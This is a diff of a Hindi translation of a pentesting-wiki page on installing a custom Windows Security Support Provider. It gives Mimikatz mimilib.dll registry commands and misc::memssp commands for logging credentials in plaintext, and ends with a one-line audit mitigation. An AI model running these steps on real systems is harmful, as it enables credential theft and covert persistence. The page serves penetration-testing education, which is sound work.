@@ -4,37 +4,37 @@
 
 ### Custom SSP
 
-[यहाँ जानें कि SSP (Security Support Provider) क्या है।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
-आप **अपना खुद का SSP** बना सकते हैं ताकि मशीन तक पहुँचने के लिए उपयोग किए गए **क्रेडेंशियल्स** को **स्पष्ट पाठ** में **कैप्चर** किया जा सके।
+[SSP (Security Support Provider) के बारे में यहां जानें।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
+आप मशीन तक पहुंचने के लिए उपयोग किए गए **credentials** को **clear text** में **capture** करने के लिए अपना **SSP** बना सकते हैं।
 
 #### Mimilib
 
-आप Mimikatz द्वारा प्रदान किए गए `mimilib.dll` बाइनरी का उपयोग कर सकते हैं। **यह सभी क्रेडेंशियल्स को स्पष्ट पाठ में एक फ़ाइल के अंदर लॉग करेगा।**\
-dll को `C:\Windows\System32\` में डालें\
-मौजूदा LSA सुरक्षा पैकेजों की एक सूची प्राप्त करें:
+आप Mimikatz द्वारा प्रदान की गई `mimilib.dll` binary का उपयोग कर सकते हैं। **यह सभी credentials को clear text में एक file के अंदर log करेगी।**\
+dll को `C:\Windows\System32\` में रखें।\
+मौजूदा LSA Security Packages की सूची प्राप्त करें:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-`mimilib.dll` को सुरक्षा समर्थन प्रदाता सूची (सुरक्षा पैकेज) में जोड़ें:
+`mimilib.dll` को Security Support Provider list (Security Packages) में जोड़ें:
 ```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-और एक रिबूट के बाद सभी क्रेडेंशियल्स `C:\Windows\System32\kiwissp.log` में स्पष्ट पाठ में पाए जा सकते हैं।
+और reboot के बाद सभी credentials `C:\Windows\System32\kiwissp.log` में clear text में पाए जा सकते हैं।
 
 #### मेमोरी में
 
-आप इसे सीधे मेमोरी में Mimikatz का उपयोग करके भी इंजेक्ट कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम नहीं कर सकता):
+आप इसे Mimikatz का उपयोग करके सीधे memory में भी inject कर सकते हैं (ध्यान दें कि यह थोड़ा unstable हो सकता है/काम नहीं कर सकता):
 ```bash
 privilege::debug
 misc::memssp
 ```
-यह रिबूट को सहन नहीं करेगा।
+यह reboot के बाद कायम नहीं रहेगा।
 
-#### शमन
+#### Mitigation
 
-इवेंट आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` का ऑडिट निर्माण/परिवर्तन
+Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` के creation/change का Audit
 
 {{#include ../../banners/hacktricks-training.md}}
